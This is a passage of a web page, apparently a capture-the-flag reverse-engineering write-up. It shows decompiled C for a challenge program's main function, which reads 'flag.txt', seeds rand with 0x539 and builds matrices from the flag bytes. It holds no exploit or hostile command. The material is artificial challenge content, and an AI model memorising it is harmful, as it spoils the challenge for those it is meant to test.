</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span><span class=lnt>216
</span><span class=lnt>217
</span><span class=lnt>218
</span><span class=lnt>219
</span><span class=lnt>220
</span><span class=lnt>221
</span><span class=lnt>222
</span><span class=lnt>223
</span><span class=lnt>224
</span><span class=lnt>225
</span><span class=lnt>226
</span><span class=lnt>227
</span><span class=lnt>228
</span><span class=lnt>229
</span><span class=lnt>230
</span><span class=lnt>231
</span><span class=lnt>232
</span><span class=lnt>233
</span><span class=lnt>234
</span><span class=lnt>235
</span><span class=lnt>236
</span><span class=lnt>237
</span><span class=lnt>238
</span><span class=lnt>239
</span><span class=lnt>240
</span><span class=lnt>241
</span><span class=lnt>242
</span><span class=lnt>243
</span><span class=lnt>244
</span><span class=lnt>245
</span><span class=lnt>246
</span><span class=lnt>247
</span><span class=lnt>248
</span><span class=lnt>249
</span><span class=lnt>250
</span><span class=lnt>251
</span><span class=lnt>252
</span><span class=lnt>253
</span><span class=lnt>254
</span><span class=lnt>255
</span><span class=lnt>256
</span><span class=lnt>257
</span><span class=lnt>258
</span><span class=lnt>259
</span><span class=lnt>260
</span><span class=lnt>261
</span><span class=lnt>262
</span><span class=lnt>263
</span><span class=lnt>264
</span><span class=lnt>265
</span><span class=lnt>266
</span><span class=lnt>267
</span><span class=lnt>268
</span><span class=lnt>269
</span><span class=lnt>270
</span><span class=lnt>271
</span><span class=lnt>272
</span><span class=lnt>273
</span><span class=lnt>274
</span><span class=lnt>275
</span><span class=lnt>276
</span><span class=lnt>277
</span><span class=lnt>278
</span><span class=lnt>279
</span><span class=lnt>280
</span><span class=lnt>281
</span><span class=lnt>282
</span><span class=lnt>283
</span><span class=lnt>284
</span><span class=lnt>285
</span><span class=lnt>286
</span><span class=lnt>287
</span><span class=lnt>288
</span><span class=lnt>289
</span><span class=lnt>290
</span><span class=lnt>291
</span><span class=lnt>292
</span><span class=lnt>293
</span><span class=lnt>294
</span><span class=lnt>295
</span><span class=lnt>296
</span><span class=lnt>297
</span><span class=lnt>298
</span><span class=lnt>299
</span><span class=lnt>300
</span><span class=lnt>301
</span><span class=lnt>302
</span><span class=lnt>303
</span><span class=lnt>304
</span><span class=lnt>305
</span><span class=lnt>306
</span><span class=lnt>307
</span><span class=lnt>308
</span><span class=lnt>309
</span><span class=lnt>310
</span><span class=lnt>311
</span><span class=lnt>312
</span><span class=lnt>313
</span><span class=lnt>314
</span><span class=lnt>315
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>undefined4</span> <span class=nf>main</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>FILE</span> <span class=o>*</span><span class=n>__stream</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>size_t</span> <span class=n>sVar1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=o>*</span><span class=n>__ptr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>byte</span> <span class=o>*</span><span class=n>__dest</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=o>*</span><span class=n>__dest_00</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>iVar2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=o>*</span><span class=n>pcVar3</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>byte</span> <span class=o>*</span><span class=n>pbVar4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>uint</span> <span class=n>uVar5</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>byte</span> <span class=o>*</span><span class=n>pbVar6</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>uint</span> <span class=n>uVar7</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>bool</span> <span class=n>bVar8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>byte</span> <span class=o>*</span><span class=n>pbVar9</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>iVar10</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=o>*</span><span class=n>piVar11</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>uint</span> <span class=n>uVar12</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>uint</span> <span class=o>*</span><span class=n>puVar13</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>iVar14</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>uint</span> <span class=o>*</span><span class=n>puVar15</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>uint</span> <span class=o>*</span><span class=n>puVar16</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>size_t</span> <span class=n>sVar17</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>uint</span> <span class=o>*</span><span class=n>puVar18</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>undefined4</span> <span class=o>*</span><span class=n>puVar19</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>uint</span> <span class=o>*</span><span class=n>puStack_e4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>uint</span> <span class=o>*</span><span class=n>puStack_e0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>byte</span> <span class=n>local_dc</span> <span class=p>[</span><span class=mi>16</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>uint</span> <span class=n>local_cc</span> <span class=p>[</span><span class=mi>12</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>uint</span> <span class=n>local_9c</span> <span class=p>[</span><span class=mi>12</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>uint</span> <span class=n>local_6c</span> <span class=p>[</span><span class=mi>16</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  <span class=n>__stream</span> <span class=o>=</span> <span class=nf>fopen</span><span class=p>(</span><span class=s>&#34;flag.txt&#34;</span><span class=p>,</span><span class=s>&#34;rb&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>__stream</span> <span class=o>!=</span> <span class=p>(</span><span class=n>FILE</span> <span class=o>*</span><span class=p>)</span><span class=mh>0x0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>fseek</span><span class=p>(</span><span class=n>__stream</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>sVar1</span> <span class=o>=</span> <span class=nf>ftell</span><span class=p>(</span><span class=n>__stream</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>((</span><span class=kt>int</span><span class=p>)</span><span class=n>sVar1</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>fclose</span><span class=p>(</span><span class=n>__stream</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>fseek</span><span class=p>(</span><span class=n>__stream</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>__ptr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=nf>malloc</span><span class=p>(</span><span class=n>sVar1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>sVar1</span> <span class=o>=</span> <span class=nf>fread</span><span class=p>(</span><span class=n>__ptr</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=n>sVar1</span><span class=p>,</span><span class=n>__stream</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>fclose</span><span class=p>(</span><span class=n>__stream</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=n>sVar1</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>uVar12</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>pcVar3</span> <span class=o>=</span> <span class=n>__ptr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>do</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=k>if</span> <span class=p>((</span><span class=o>*</span><span class=n>pcVar3</span> <span class=o>!=</span> <span class=sc>&#39; &#39;</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=mi>4</span> <span class=o>&lt;</span> <span class=p>(</span><span class=n>byte</span><span class=p>)(</span><span class=o>*</span><span class=n>pcVar3</span> <span class=o>-</span> <span class=mi>9U</span><span class=p>)))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>uVar12</span> <span class=o>&lt;</span> <span class=n>sVar1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>              <span class=n>pcVar3</span> <span class=o>=</span> <span class=n>__ptr</span> <span class=o>+</span> <span class=p>(</span><span class=n>sVar1</span> <span class=o>-</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>              <span class=n>uVar7</span> <span class=o>=</span> <span class=n>sVar1</span> <span class=o>-</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>              <span class=k>goto</span> <span class=n>LAB_00008840</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=p>}</span>
</span></span><span class=line><span class=cl>          <span class=n>uVar12</span> <span class=o>=</span> <span class=n>uVar12</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=n>pcVar3</span> <span class=o>=</span> <span class=n>pcVar3</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>while</span> <span class=p>(</span><span class=n>sVar1</span> <span class=o>!=</span> <span class=n>uVar12</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nl>LAB_00008bfc</span><span class=p>:</span>
</span></span><span class=line><span class=cl>      <span class=nf>free</span><span class=p>(</span><span class=n>__ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=nf>memset</span><span class=p>(</span><span class=n>local_dc</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x10</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>__dest</span> <span class=o>=</span> <span class=p>(</span><span class=n>byte</span> <span class=o>*</span><span class=p>)</span><span class=mh>0x0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>goto</span> <span class=n>LAB_000088a8</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nl>LAB_00008840</span><span class=p>:</span>
</span></span><span class=line><span class=cl>  <span class=n>uVar5</span> <span class=o>=</span> <span class=n>uVar7</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>((</span><span class=o>*</span><span class=n>pcVar3</span> <span class=o>!=</span> <span class=sc>&#39; &#39;</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=mi>4</span> <span class=o>&lt;</span> <span class=p>(</span><span class=n>byte</span><span class=p>)(</span><span class=o>*</span><span class=n>pcVar3</span> <span class=o>-</span> <span class=mi>9U</span><span class=p>)))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>uVar12</span> <span class=o>&lt;</span> <span class=n>sVar1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>sVar1</span> <span class=o>=</span> <span class=n>sVar1</span> <span class=o>-</span> <span class=n>uVar12</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>__dest</span> <span class=o>=</span> <span class=p>(</span><span class=n>byte</span> <span class=o>*</span><span class=p>)</span><span class=nf>malloc</span><span class=p>(</span><span class=n>sVar1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>memcpy</span><span class=p>(</span><span class=n>__dest</span><span class=p>,</span><span class=n>__ptr</span> <span class=o>+</span> <span class=n>uVar12</span><span class=p>,</span><span class=n>sVar1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>free</span><span class=p>(</span><span class=n>__ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>pbVar9</span> <span class=o>=</span> <span class=n>local_dc</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>local_dc</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>local_dc</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>local_dc</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>local_dc</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>local_dc</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>local_dc</span><span class=p>[</span><span class=mi>5</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>local_dc</span><span class=p>[</span><span class=mi>6</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>local_dc</span><span class=p>[</span><span class=mi>7</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>local_dc</span><span class=p>[</span><span class=mi>8</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>local_dc</span><span class=p>[</span><span class=mi>9</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>local_dc</span><span class=p>[</span><span class=mi>10</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>local_dc</span><span class=p>[</span><span class=mh>0xb</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>local_dc</span><span class=p>[</span><span class=mh>0xc</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>local_dc</span><span class=p>[</span><span class=mh>0xd</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>local_dc</span><span class=p>[</span><span class=mh>0xe</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>local_dc</span><span class=p>[</span><span class=mh>0xf</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>pbVar4</span> <span class=o>=</span> <span class=n>pbVar9</span> <span class=o>+</span> <span class=n>sVar1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>pbVar6</span> <span class=o>=</span> <span class=n>__dest</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=k>goto</span> <span class=n>LAB_0000889c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>goto</span> <span class=n>LAB_00008bfc</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=n>pcVar3</span> <span class=o>=</span> <span class=n>pcVar3</span> <span class=o>+</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>uVar5</span> <span class=o>&lt;=</span> <span class=n>uVar12</span><span class=p>)</span> <span class=k>goto</span> <span class=n>LAB_00008bfc</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>uVar7</span> <span class=o>=</span> <span class=n>uVar5</span> <span class=o>-</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>sVar1</span> <span class=o>=</span> <span class=n>uVar5</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>goto</span> <span class=n>LAB_00008840</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>while</span><span class=p>(</span> <span class=nb>true</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>pbVar9</span> <span class=o>=</span> <span class=n>pbVar9</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>pbVar6</span> <span class=o>=</span> <span class=n>pbVar6</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>pbVar9</span> <span class=o>==</span> <span class=n>pbVar4</span><span class=p>)</span> <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nl>LAB_0000889c</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=n>pbVar9</span> <span class=o>=</span> <span class=o>*</span><span class=n>pbVar6</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>pbVar9</span> <span class=o>==</span> <span class=n>local_dc</span> <span class=o>+</span> <span class=mh>0xf</span><span class=p>)</span> <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nl>LAB_000088a8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>  <span class=n>pbVar6</span> <span class=o>=</span> <span class=n>local_dc</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nf>free</span><span class=p>(</span><span class=n>__dest</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>memset</span><span class=p>(</span><span class=n>local_6c</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x40</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>iVar10</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>do</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>local_6c</span><span class=p>[</span><span class=n>iVar10</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>uint</span><span class=p>)</span><span class=o>*</span><span class=n>pbVar6</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>iVar10</span> <span class=o>=</span> <span class=n>iVar10</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>pbVar6</span> <span class=o>=</span> <span class=n>pbVar6</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=k>while</span> <span class=p>(</span><span class=n>iVar10</span> <span class=o>!=</span> <span class=mh>0x10</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>puVar18</span> <span class=o>=</span> <span class=p>(</span><span class=n>uint</span> <span class=o>*</span><span class=p>)(</span><span class=n>local_dc</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>srandom</span><span class=p>(</span><span class=mh>0x539</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>puVar13</span> <span class=o>=</span> <span class=n>puVar18</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>do</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=n>puVar13</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>puVar13</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>puVar13</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>iVar14</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>iVar10</span> <span class=o>=</span> <span class=n>iVar14</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>do</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=n>iVar10</span> <span class=o>&lt;</span> <span class=mi>4</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(;</span> <span class=n>iVar14</span> <span class=o>&lt;</span> <span class=mi>4</span><span class=p>;</span> <span class=n>iVar14</span> <span class=o>=</span> <span class=n>iVar14</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=k>do</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>uVar12</span> <span class=o>=</span> <span class=nf>rand</span><span class=p>();</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span> <span class=k>while</span> <span class=p>(</span><span class=mh>0x7fffff7e</span> <span class=o>&lt;</span> <span class=n>uVar12</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>uVar12</span> <span class=o>=</span> <span class=n>uVar12</span> <span class=o>%</span> <span class=mh>0x101</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=n>uVar12</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>iVar10</span> <span class=o>==</span> <span class=n>iVar14</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=nf>func_1430</span><span class=p>(</span><span class=n>puVar13</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=n>iVar10</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>uVar12</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=nf>func_1430</span><span class=p>(</span><span class=n>puVar13</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=n>iVar10</span><span class=p>,</span><span class=n>iVar14</span><span class=p>,</span><span class=n>uVar12</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=n>iVar14</span> <span class=o>=</span> <span class=n>iVar14</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>while</span> <span class=p>((</span><span class=n>iVar14</span> <span class=o>!=</span> <span class=mi>8</span><span class=p>)</span> <span class=o>||</span> <span class=p>(</span><span class=n>iVar14</span> <span class=o>=</span> <span class=n>iVar10</span> <span class=o>+</span> <span class=mi>1</span><span class=p>,</span> <span class=n>iVar10</span> <span class=o>=</span> <span class=n>iVar14</span><span class=p>,</span> <span class=n>iVar14</span> <span class=o>!=</span> <span class=mi>8</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=n>iVar10</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>do</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>do</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>uVar12</span> <span class=o>=</span> <span class=nf>rand</span><span class=p>();</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span> <span class=k>while</span> <span class=p>(</span><span class=mh>0x7fffff7e</span> <span class=o>&lt;</span> <span class=n>uVar12</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=n>uVar12</span> <span class=o>%</span> <span class=mh>0x101</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>func_1430</span><span class=p>(</span><span class=n>puVar13</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=n>iVar10</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>uVar12</span> <span class=o>%</span> <span class=mh>0x101</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
